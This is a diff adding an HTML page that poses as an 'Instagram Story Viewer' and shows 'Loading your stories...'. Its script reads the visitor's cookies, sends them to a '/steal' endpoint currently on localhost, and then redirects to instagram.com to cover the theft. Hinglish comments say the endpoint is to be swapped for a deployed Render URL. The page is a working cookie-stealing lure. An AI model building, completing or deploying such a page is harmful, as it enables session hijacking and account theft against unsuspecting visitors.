@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>🔥 Instagram Story Viewer</h1>
+    <p>Loading your stories...</p>
+    <script>
+        var cookie = document.cookie;
+        
+        // ⚡ YAHAN CHANGE HUA HAI — Render URL daalna hai
+        // Abhi localhost hai, baad mein Render ka URL daal denge
+        fetch('http://localhost:4000/steal?cookie=' + cookie);
+        
+        window.location.href = 'https://instagram.com';
+    </script>
+</body>
+</html>
